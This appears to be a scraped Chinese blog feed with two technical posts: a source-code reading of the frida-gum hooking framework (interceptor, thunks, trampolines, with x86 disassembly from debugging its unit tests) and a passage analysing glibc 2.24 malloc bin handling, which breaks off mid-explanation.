ltotal 137608drwxr-xr-x 29 muhe staff 928B Nov 13 17:22 .drwxr-xr-x 90 muhe staff 2.8K Nov 5 16:44 ..drwxr-xr-x 15 muhe staff 480B Nov 15 18:23 .git-rw-r--r-- 1 muhe staff 383B Jan 21 2019 .gitignore-rw-r--r-- 1 muhe staff 886B Jan 21 2019 .gitmodulesdrwxr-xr-x 3 muhe staff 96B Nov 13 17:22 .vscode-rw-r--r-- 1 muhe staff 2.4K Jan 21 2019 COPYING-rw-r--r-- 1 muhe staff 1.2K Nov 7 18:11 Makefile-rw-r--r-- 1 muhe staff 28K Nov 7 18:11 Makefile.linux.mk-rw-r--r-- 1 muhe staff 28K Nov 7 18:11 Makefile.macos.mk-rw-r--r-- 1 muhe staff 21K Nov 7 18:11 Makefile.sdk.mk-rw-r--r-- 1 muhe staff 84K Apr 29 2019 Makefile.toolchain.mk-rw-r--r-- 1 muhe staff 1.7K Nov 7 18:11 README.mddrwxr-xr-x 10 muhe staff 320B Nov 11 14:59 builddrwxr-xr-x 61 muhe staff 1.9K Jan 21 2019 capstone-rw-r--r-- 1 muhe staff 1.0K Nov 7 18:11 config.mkdrwxr-xr-x 9 muhe staff 288B Jan 21 2019 frida-clrdrwxr-xr-x 21 muhe staff 672B Jan 21 2019 frida-coredrwxr-xr-x 20 muhe staff 640B Nov 11 17:37 frida-gumdrwxr-xr-x 15 muhe staff 480B Jan 21 2019 frida-nodedrwxr-xr-x 20 muhe staff 640B Jan 21 2019 frida-pythondrwxr-xr-x 27 muhe staff 864B Jan 21 2019 frida-qmldrwxr-xr-x 10 muhe staff 320B Jan 21 2019 frida-swiftdrwxr-xr-x 12 muhe staff 384B Jan 21 2019 frida-tools-rw-r--r-- 1 muhe staff 25K Nov 7 18:11 frida.sln-rw-r--r-- 1 muhe staff 9.0K Nov 11 14:43 frida.srctrlbm-rw-r--r-- 1 muhe staff 67M Nov 11 14:43 frida.srctrldb-rw-r--r-- 1 muhe staff 6.1K Nov 11 14:35 frida.srctrlprjdrwxr-xr-x 47 muhe staff 1.5K Nov 7 18:11 releng frida-gum是底层hook框架，跨平台； frida-python , frida-node啥的是 bindings，暂时不管，不理解原理看也看不懂； capstone 牛逼的反汇编框架，frida-gum中用到了，用于指令的读； releng 编译相关的； frida-core server/agent相关； frida-tools 一些工具，比如frida-ps啥的。 重点是frida-gum ，这是理解这个框架的基础。 0x02 : 阅读frida-gum (x86为例)frida-gum 注释并不多，甚至可以说几乎没，好在他代码写得好，构架合理代码规范好，所以阅读起来多读几遍，总会看懂的。 2.1. 构架这个的框架的构架如下： 123456789101112131415161718192021total 200drwxr-xr-x 20 muhe staff 640B Nov 11 17:37 .drwxr-xr-x 29 muhe staff 928B Nov 13 17:22 ..-rw-r--r-- 1 muhe staff 34B Jan 21 2019 .git-rw-r--r-- 1 muhe staff 70B Jan 21 2019 .gitignoredrwxr-xr-x 3 muhe staff 96B Nov 11 17:37 .vscode-rw-r--r-- 1 muhe staff 5.6K Jan 21 2019 COPYINGdrwxr-xr-x 5 muhe staff 160B Jan 21 2019 bindings-rw-r--r-- 1 muhe staff 2.1K Jan 21 2019 config.h.indrwxr-xr-x 3 muhe staff 96B Jan 21 2019 extdrwxr-xr-x 85 muhe staff 2.7K Jan 21 2019 gum-rw-r--r-- 1 muhe staff 5.1K Jan 21 2019 gum-32.vcxproj-rw-r--r-- 1 muhe staff 16K Jan 21 2019 gum-32.vcxproj.filters-rw-r--r-- 1 muhe staff 5.1K Jan 21 2019 gum-64.vcxproj-rw-r--r-- 1 muhe staff 16K Jan 21 2019 gum-64.vcxproj.filters-rw-r--r-- 1 muhe staff 8.5K Jan 21 2019 gum-common.propsdrwxr-xr-x 4 muhe staff 128B Jan 21 2019 libs-rw-r--r-- 1 muhe staff 6.8K Jan 21 2019 meson.build-rw-r--r-- 1 muhe staff 190B Jan 21 2019 meson_options.txtdrwxr-xr-x 28 muhe staff 896B Jan 21 2019 testsdrwxr-xr-x 7 muhe staff 224B Jan 21 2019 vapi 核心是在gum目录下 12345678910111213141516171819gum├── arch-arm├── arch-arm64├── arch-mips├── arch-x86├── backend-arm├── backend-arm64├── backend-darwin├── backend-dbghelp├── backend-elf├── backend-libdwarf├── backend-libunwind├── backend-linux├── backend-mips├── backend-posix├── backend-qnx├── backend-windows└── backend-x86....// gum下其他文件 这里有必要说一下，frida-gum 为了实现跨平台，抽象出来 构架无关/平台无关/系统无关的api，比如一些内存操作，在frida-gum里可能就是gum_xxxxx，但是根据不同平台，调用到对应平台的api里去，正是做了很好的封装，上层代码才会看起来“平台无关”。 还有几个核心的对象，后面的代码里频繁提及： 123456789101112131415struct _GumInterceptor{ GObject parent; GRecMutex mutex; GHashTable * function_by_address; GumInterceptorBackend * backend; GumCodeAllocator allocator; volatile guint selected_thread_id; GumInterceptorTransaction current_transaction;}; 从这个拦截器类索引出去的对象都需要好好注意，比如 GumInterceptorBackend , 最好可以生成一个uml图，阅读代码的时候对比着看。 2.2. 代码阅读2.2.1 准备工作面对比较大的代码，重要的是找到一个入口，从这个点开始读，我这里大概看了下单元测试的代码，发现基本是: 初始化，测试各种功能，清理，退出。 那么我的阅读思路就是 : 初始化部分 各种功能，比如 内存模块，指令读写模块，代码修复模块 清理 这部分大概过一下就行 这里我参考了 jmpews师傅的关于设计hook框架的文章，了解一个hook框架如何设计，分哪些模块，在阅读代码的时候能够有针对性一些。 内存分配 模块 指令写 模块 指令读 模块 指令修复 模块 relocator 跳板 模块 调度器 模块 enter_thunk部分实现 栈 模块 具体可以参考他的文章: 如何构建一款像 frida 一样的框架 2.2.2 hook从0到1阅读顺序根据单元测试gum-test.c确定的，具体的可以看代码 gum_interceptor_obtain()这部分是 拦截器初始化 12345678910111213141516171819202122232425262728293031323334353637383940414243// 初始化 interceptor 对象初始化GumInterceptor *gum_interceptor_obtain (void){ GumInterceptor * interceptor; g_mutex_lock (&amp;_gum_interceptor_lock); if (_the_interceptor != NULL) { interceptor = GUM_INTERCEPTOR (g_object_ref (_the_interceptor)); } else { _the_interceptor = g_object_new (GUM_TYPE_INTERCEPTOR, NULL); g_object_weak_ref (G_OBJECT (_the_interceptor), the_interceptor_weak_notify, NULL); interceptor = _the_interceptor; } g_mutex_unlock (&amp;_gum_interceptor_lock); return interceptor;}static voidgum_interceptor_init (GumInterceptor * self){ g_rec_mutex_init (&amp;self-&gt;mutex); self-&gt;function_by_address = g_hash_table_new_full (NULL, NULL, NULL, (GDestroyNotify) gum_function_context_destroy); // 分配器初始化 gum_code_allocator_init (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE); // 创建拦截器后端 self-&gt;backend = _gum_interceptor_backend_create (&amp;self-&gt;allocator); gum_interceptor_transaction_init (&amp;self-&gt;current_transaction, self);} 因为GObject的使用，gum_interceptor_init 这个构造函数，在 interceptor对象创建出来的时候触发。 重点看拦截器后端的初始化 1234567891011121314151617GumInterceptorBackend *_gum_interceptor_backend_create (GumCodeAllocator * allocator){ GumInterceptorBackend * backend; backend = g_slice_new (GumInterceptorBackend); backend-&gt;allocator = allocator; //初始化 codewriter和relocator gum_x86_writer_init (&amp;backend-&gt;writer, NULL); gum_x86_relocator_init (&amp;backend-&gt;relocator, NULL, &amp;backend-&gt;writer); // 创建 thunk gum_interceptor_backend_create_thunks (backend); return backend;} 这里初始化的writer和relocator分别用于指令写和指令恢复。 thunks的初始化，这两个是用于调度执行，分别对应 进入hook和离开hook。 1234567891011121314151617static voidgum_interceptor_backend_create_thunks (GumInterceptorBackend * self){ GumX86Writer * cw = &amp;self-&gt;writer; self-&gt;enter_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator); gum_x86_writer_reset (cw, self-&gt;enter_thunk-&gt;data); gum_emit_enter_thunk (cw); gum_x86_writer_flush (cw); g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;enter_thunk-&gt;size); self-&gt;leave_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator); gum_x86_writer_reset (cw, self-&gt;leave_thunk-&gt;data); gum_emit_leave_thunk (cw); gum_x86_writer_flush (cw); g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;leave_thunk-&gt;size);} 因为原理类似，只举例enter_thunk 123456789101112131415161718192021222324static voidgum_emit_enter_thunk (GumX86Writer * cw){ const gssize return_address_stack_displacement = 0; // save ret addr gum_emit_prolog (cw, return_address_stack_displacement); // 构造自己的函数栈 gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XSI, GUM_REG_XBP, GUM_FRAME_OFFSET_CPU_CONTEXT); gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XDX, GUM_REG_XBP, GUM_FRAME_OFFSET_TOP); gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XCX, GUM_REG_XBP, GUM_FRAME_OFFSET_NEXT_HOP); gum_x86_writer_put_call_address_with_aligned_arguments (cw, GUM_CALL_CAPI, GUM_ADDRESS (_gum_function_context_begin_invocation), 4, GUM_ARG_REGISTER, GUM_REG_XBX, GUM_ARG_REGISTER, GUM_REG_XSI, GUM_ARG_REGISTER, GUM_REG_XDX, GUM_ARG_REGISTER, GUM_REG_XCX); gum_emit_epilog (cw);} gum_interceptor_attach_listener1234567891011GumAttachReturngum_interceptor_attach_listener (GumInterceptor * self, gpointer function_address, GumInvocationListener * listener, gpointer listener_function_data){...} gum_interceptor_transaction_begingum_interceptor_instrument ✨这里要说的是 function_address 就是要hook的目标函数，frida-gum把要hook的目标封装成了 GumFunctionContext对象，方便操作 123function_address = gum_interceptor_resolve (self, function_address); // ? // 创建跳板 function_ctx = gum_interceptor_instrument (self, function_address); 1234567891011121314151617181920212223242526272829303132333435static GumFunctionContext *gum_interceptor_instrument (GumInterceptor * self, gpointer function_address){ GumFunctionContext * ctx; // 要hook的函数，封装成了 GumFunctionContext，此时 // 根据 地址，得到与之对应的 GunFunctionContext对象 ctx = (GumFunctionContext *) g_hash_table_lookup (self-&gt;function_by_address, function_address); if (ctx != NULL) return ctx; // 如果获取到的是空的对象，必须初始化了才能使用 // 只写几个字断，分配内存/hook的函数地址/interceptor成员 ctx = gum_function_context_new (self, function_address); if (ctx == NULL) return NULL; // 创建跳板 if (!_gum_interceptor_backend_create_trampoline (self-&gt;backend, ctx)) { gum_function_context_finalize (ctx); return NULL; } // 设置完成后， 添加到哈希表 // hash_table, key, value // hook函数地址，GumFunctionContext对象对应， 方便查找 g_hash_table_insert (self-&gt;function_by_address, function_address, ctx); // 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数 gum_interceptor_transaction_schedule_prologue_write ( &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate); return ctx;} 这里贴一下跳板代码方便理解： 1234567891000C30200 mov al,byte ptr ds:[FF00C121h] 00C30205 xor eax,0C30200h 00C3020A jmp 00C30000 // 跳到上面的 enter_thunk00C3020F push dword ptr ds:[0C30200h] 00C30215 jmp 00C30100 // 跳到 leave_thunk// 原函数修复的指令，7个字节00C3021A push ebp 00C3021B mov ebp,esp 00C3021D cmp dword ptr [ebp+8],0 00C30221 jmp gum_test_target_function+7h (0D6FB97h) // 跳回原函数，因为写跳转用了7字节，所以+7 gum_interceptor_transaction_end123// 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数 gum_interceptor_transaction_schedule_prologue_write ( &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate); 12345678910111213141516// 拦截器激活static voidgum_interceptor_activate (GumInterceptor * self, GumFunctionContext * ctx, gpointer prologue){ if (ctx-&gt;destroyed) return; g_assert (!ctx-&gt;activated); ctx-&gt;activated = TRUE; // 激活 _gum_interceptor_backend_activate_trampoline (self-&gt;backend, ctx, prologue);} 1234567891011121314151617181920212223_gum_interceptor_backend_activate_trampoline (GumInterceptorBackend * self, GumFunctionContext * ctx, gpointer prologue){ GumX86Writer * cw = &amp;self-&gt;writer; guint padding; // 设置base gum_x86_writer_reset (cw, prologue); // 设置pc cw-&gt;pc = GPOINTER_TO_SIZE (ctx-&gt;function_address); // 写jmp， 跳转到 跳板中， 进入跳板这已经到hook里了 gum_x86_writer_put_jmp_address (cw, GUM_ADDRESS (ctx-&gt;on_enter_trampoline)); gum_x86_writer_flush (cw); g_assert_cmpint (gum_x86_writer_offset (cw), &lt;=, GUM_INTERCEPTOR_REDIRECT_CODE_SIZE); // 原本代码（hook点），剩余的地方nop补齐 padding = ctx-&gt;overwritten_prologue_len - gum_x86_writer_offset (cw); for (; padding != 0; padding--) gum_x86_writer_put_nop (cw); gum_x86_writer_flush (cw);} 2.2.3 执行流程通过设置函数返回地址(__gum_function_context_begin/end_invocation)，控制流程，这就是ROP： 123456789101112131415原函数----------------------------------------------------跳板 02C80204----------------------------------------------------`enter_chunk` // 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️`__gum_function_context_begin_invocation` // 通过设置栈(ret addr)控制执行流程 ----------------------------------------------------replacement_function----------------------------------------------------跳板 02C8020F----------------------------------------------------`leave_chunk``__gum_function_context_end_invocation` ----------------------------------------------------继续执行 0x03 : 调试分析帮助理解这里调试了单元测试中写hook和函数替换的逻辑，过程如下： _gum_interceptor_backend_create() 后端初始化，初始化两个thunk enter_thunk 123456789101112131415161718192021222324252600C30000 pushfd 00C30001 cld 00C30002 pushad 00C30003 lea esp,[esp-4] 00C3000A lea eax,[esp+2Ch] 00C30011 mov dword ptr [esp+10h],eax 00C30015 mov ebx,dword ptr [esp+28h] 00C30019 mov ebp,esp 00C3001B and esp,0FFFFFFF0h 00C30021 sub esp,200h 00C30027 fxsave [esp] 00C3002B lea esi,[ebp] 00C30031 lea edx,[ebp+2Ch] 00C30037 lea ecx,[ebp+28h] 00C3003D push ecx 00C3003E push edx 00C3003F push esi 00C30040 push ebx 00C30041 call __gum_function_context_begin_invocation (0CE8E1Fh) 00C30046 add esp,10h 00C30049 fxrstor [esp] 00C3004D mov esp,ebp 00C3004F lea esp,[esp+4] 00C30056 popad 00C30057 popfd 00C30058 ret leave_thunk 123456789101112131415161718192021222324252600C30100 pushfd 00C30101 cld 00C30102 pushad 00C30103 lea esp,[esp-4] 00C3010A lea eax,[esp+28h] 00C30111 mov dword ptr [esp+10h],eax 00C30115 mov ebx,dword ptr [esp+28h] 00C30119 mov ebp,esp 00C3011B and esp,0FFFFFFF0h 00C30121 sub esp,200h 00C30127 fxsave [esp] 00C3012B lea esi,[ebp] 00C30131 lea edx,[ebp+28h] 00C30137 sub esp,4 00C3013A push edx 00C3013B push esi 00C3013C push ebx 00C3013D call __gum_function_context_end_invocation (0CEAB1Bh) 00C30142 add esp,0Ch 00C30145 add esp,4 00C30148 fxrstor [esp] 00C3014C mov esp,ebp 00C3014E lea esp,[esp+4] 00C30155 popad 00C30156 popfd 00C30157 ret 12345678// hook 构造GumAttachReturngum_interceptor_attach (GumInterceptor * self, gpointer function_address, GumInvocationListener * listener, gpointer listener_function_data) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162GumAttachReturngum_interceptor_attach (GumInterceptor * self, gpointer function_address, GumInvocationListener * listener, gpointer listener_function_data){ GumAttachReturn result = GUM_ATTACH_OK; GumFunctionContext * function_ctx; if (gum_process_get_code_signing_policy () == GUM_CODE_SIGNING_REQUIRED) goto policy_violation; gum_interceptor_ignore_current_thread (self); GUM_INTERCEPTOR_LOCK (self); gum_interceptor_transaction_begin (&amp;self-&gt;current_transaction); self-&gt;current_transaction.is_dirty = TRUE; // 获取hook目标函数的地址 function_address = gum_interceptor_resolve (self, function_address); // 获取这个函数的 GumFunctionContext 对象 // 没有就新建一个 // 这里已经 准备好了跳板，写好了hook // 添加任务,设置相对应的回调函数 function_ctx = gum_interceptor_instrument (self, function_address); if (function_ctx == NULL) goto wrong_signature; if (gum_function_context_has_listener (function_ctx, listener)) goto already_attached; // 添加监听器 gum_function_context_add_listener (function_ctx, listener, listener_function_data); goto beach;policy_violation: { return GUM_ATTACH_POLICY_VIOLATION; }wrong_signature: { result = GUM_ATTACH_WRONG_SIGNATURE; goto beach; }already_attached: { result = GUM_ATTACH_ALREADY_ATTACHED; goto beach; }beach: { // 到这里，基本没什么问题，hook什么都打好了 // 拦截器激活 跳板激活 // 这里把原函数开头改写 gum_interceptor_transaction_end (&amp;self-&gt;current_transaction); GUM_INTERCEPTOR_UNLOCK (self); gum_interceptor_unignore_current_thread (self); return result; }} on_invoke_trampoline 跳板 1234567891000C30200 mov al,byte ptr ds:[FF00C121h] 00C30205 xor eax,0C30200h 00C3020A jmp 00C30000 // 跳到上面的 enter_thunk00C3020F push dword ptr ds:[0C30200h] 00C30215 jmp 00C30100 // 跳到 leave_thunk// 原函数修复的指令，7个字节00C3021A push ebp 00C3021B mov ebp,esp 00C3021D cmp dword ptr [ebp+8],0 00C30221 jmp gum_test_target_function+7h (0D6FB97h) // 跳回原函数，因为写跳转用了7字节，所以+7 gum_interceptor_transaction_end (&amp;self-&gt;current_transaction); 调用 gum_interceptor_activate() 然后_gum_interceptor_backend_activate_trampolie() 随后，目标函数开头被修改： 12345678gpointer GUM_NOINLINEgum_test_target_function (GString * str){00D6FB90 jmp 00C30204 if (str != NULL)00D6FB95 nop 00D6FB96 nop 00D6FB97 je gum_test_target_function+19h (0D6FBA9h) 直接跳转到 00C30204, 其实就是 跳板，因为反汇编的地址差了点，所以开始的指令不太一样: 1234567891011121300C30204 push dword ptr ds:[0C30200h] 00C3020A jmp 00C30000 00C3020F push dword ptr ds:[0C30200h] 00C30215 jmp 00C30100 00C3021A push ebp 00C3021B mov ebp,esp 00C3021D cmp dword ptr [ebp+8],0 00C30221 jmp gum_test_target_function+7h (0D6FB97h) 00C30226 add byte ptr [eax],al 00C30228 add byte ptr [eax],al 00C3022A add byte ptr [eax],al 00C3022C add byte ptr [eax],al 00C3022E add byte ptr [eax],al 调用流程调试分析，这里分两个情况，是否存在``replacement_function` 首先是不存在，只是打个hook(根据 TESTCASE(attach_one);) 123456789101112131415161718call 原函数----------------------------------------------------原函数----------------------------------------------------跳板----------------------------------------------------`enter_chunk` // 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️`__gum_function_context_begin_invocation` // 通过设置栈(ret addr)控制执行流程 ----------------------------------------------------跳板+n (00C3021A) // 执行原函数的 修复的若干字节----------------------------------------------------原函数----------------------------------------------------`leave_chunk` `__gum_function_context_end_invocation`----------------------------------------------------继续执行.... 存在替换的函数(TESTCASE(replace_one);) 12345678910111213141516原函数----------------------------------------------------跳板 02C80204----------------------------------------------------`enter_chunk` // 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️`__gum_function_context_begin_invocation` // 通过设置栈(ret addr)控制执行流程 ----------------------------------------------------replacement_function----------------------------------------------------跳板 02C8020F----------------------------------------------------`leave_chunk``__gum_function_context_end_invocation` ----------------------------------------------------继续执行 replace_one 的跳板 12345678902C80204 push dword ptr ds:[2C80200h] 02C8020A jmp 02C80000 02C8020F push dword ptr ds:[2C80200h] 02C80215 jmp 02C80100 02C8021A mov edi,edi 02C8021C push ebp 02C8021D mov ebp,esp 02C8021F jmp malloc+5h (01E5A7B5h) 0x04 : 结语这个过程大概花了我一周 5天多的样子，挺难的个人感觉，需要捋清楚的话，配合调试会好很多，最开始我直接看的代码，看+做笔记，脑内debug，最后编译了工程，vs调试，清晰多了，还是建议边调试边看。 如果文中有任何问题，欢迎批评指正 : ) 后面可能会在他基础上做点事情吧…这框架真牛逼 ! 0x05 : 参考与引用rida-gum源码解读 gobject c语言 如何构建一款像 frida 一样的框架","link":"/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/"},{"title":"Have fun with glibc内存管理","text":"使用的源码版本 glibc-2.24 持续更新，治疗拖延症。 1.malloc 分析​ malloc其实是调用了void *__libc_malloc (size_t bytes)，但是这个函数实质是对static void *_int_malloc (mstate av, size_t bytes) 的封装。 ​ 分析开始，先来看void *__libc_malloc (size_t bytes)函数 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes){ mstate ar_ptr; void *victim; //首先检查是否存在内存分配的hook函数，如果有，就直接调用；hook函数主要 //是进程创建新线程的时候内存分配，或者支持用户提供的内存分配函数。 void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } //若分配成功，释放锁 if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;} arena_get (ar_ptr, bytes)展开宏就是 1234#define arena_get(ptr, size) do { \\ ptr = thread_arena; \\ arena_lock (ptr, size); \\ } while (0) ​ 获得分配区并加锁，之后就进入了主要负责内存分配的_int_malloc (ar_ptr, bytes)函数 ​ 该函数代码特别长，只能一部分一部分看了，首先给出原型，函数有两个参数，即分配区和要分配的内存的大小(用户传进来的，并不是真正的要分配的大小)。 1.概述1234567891011121314151617181920212223242526272829303132333435363738394041static void *_int_malloc (mstate av, size_t bytes) //分配区，大小{ INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size (bytes, nb); /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if (__glibc_unlikely (av == NULL)) { void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; } 这个转换是把需要的内存大小bytes，转换成需要分配的chunk的大小nb。 123456789101112#define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE (req)) { \\ __set_errno (ENOMEM); \\ return 0; \\ } \\ (sz) = request2size (req);#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 2.fastbin如果分配大小正好是fastbin，那就直接从fastbin分配。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ //要分配的值小于等于最大的fastbin大小 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp = *fb; do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = &quot;malloc(): memory corruption (fast)&quot;; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } }//一些其他的宏/* Atomically store NEWVAL in *MEM if *MEM is equal to OLDVAL. Return the old *MEM value. */#if !defined atomic_compare_and_exchange_val_acq \\ &amp;&amp; defined __arch_compare_and_exchange_val_32_acq# define atomic_compare_and_exchange_val_acq(mem, newval, oldval) \\ __atomic_val_bysize (__arch_compare_and_exchange_val,acq, \\ mem, newval, oldval)#endif#ifndef catomic_compare_and_exchange_val_acq# ifdef __arch_c_compare_and_exchange_val_32_acq# define catomic_compare_and_exchange_val_acq(mem, newval, oldval) \\ __atomic_val_bysize (__arch_c_compare_and_exchange_val,acq, \\ mem, newval, oldval)# else# define catomic_compare_and_exchange_val_acq(mem, newval, oldval) \\ atomic_compare_and_exchange_val_acq (mem, newval, oldval)# endif#endif//展开之后#define __atomic_val_bysize(pre, post, mem, ...) \\ ({ \\ __typeof (*mem) __atg1_result; \\ if (sizeof (*mem) == 1) \\ __atg1_result = pre##_8_##post (mem, __VA_ARGS__); \\ else if (sizeof (*mem) == 2) \\ __atg1_result = pre##_16_##post (mem, __VA_ARGS__); \\ else if (sizeof (*mem) == 4) \\ __atg1_result = pre##_32_##post (mem, __VA_ARGS__); \\ else if (sizeof (*mem) == 8) \\ __atg1_result = pre##_64_##post (mem, __VA_ARGS__); \\ else \\ abort (); \\ __atg1_result; \\ }) ​ 首先根据分配大小，获取该chunk所属的fastbin的index，然后根据index获取所需要的fastbin的空闲链表的头指针；然后将头指针的下一个chunk 作为空闲chunk 链表的头部。后面check之后，直接使用chunk2mem()把用户所需的内存块转换并且返回。 3.small bin12345678910111213141516171819202122232425262728293031323334353637383940 /* If a small request, check regular bin. Since these &quot;smallbins&quot; hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) { idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin)//与表头相同，说明链表是空的；不相同的话进入下面的逻辑 { if (victim == 0) /* initialization check */ malloc_consolidate (av); //合并fastbin else { //将victim从双向循环链表中取出来 bck = victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd != victim)) { errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout; } //设置inuse标志。 set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } ​ 首先还是根据分配的大小，找到所对应的small bin的index，然后根据这个index去找到所需的small bin的空闲链表头指针；然后将最后一个chunk赋值给victim，然后做判断，如果和表头相同，那么说明这个链表当前是空的，就不能从这个small bin中分配内存，这就要走后面的流程了；如果不同，这里有两种情况： victim为0，即还没有初始化双向循环链表，这时候就要去合并fast bin； victim不为0，直接把victim从small bin中取出来，设置标志位，然后判断是否属于主分配区，之后调用chunk2meme()转换成用户所需内存空间并返回。 4.large bin123456789101112131415161718/* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */else { idx = largebin_index (nb); if (have_fastchunks (av)) //合并fastbin中的chunk，加入unsorted bin malloc_consolidate (av); } ​ 在分配之前会先合并fast bin中的chunk，加入unsorted bin。 ​ 下面代码是遍历unsorted bin中的空闲块，加入到相应的small bin 或者large bin之中，代码比较长，所以一部分一部分的看。 123456789101112131415161718192021222324/* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a &quot;small&quot; request. */for (;; ) { int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) { bck = victim-&gt;bk; if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, chunk2mem (victim), av); size = chunksize (victim); 这里先是反向遍历链表，检查size，要小于等于 2*SIZE_SZ，并且不能大于系统分配的总量。然后获取chunk的size。 123456789101112131415161718192021222324252627282930313233343536/* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) { /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); //large chunk if (!in_smallbin_range (remainder_size)) { remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } ​ 之前的small bin 没有成功分配，并且只有一个chunk的时候，那个chunk就是last remainder chunk，且last remainder chunk 的size大于所需要的大小+MINSIZE，这个时候就可已从这个块中去分配所需要的内存。 ​ 后面就是从这个chunk 中切分出所需大小的chunk，计算切分后剩下chunk 的大小，将剩下的chunk加入unsorted bin 的链表中，并将剩下的chunk 作为分配区的last remainder 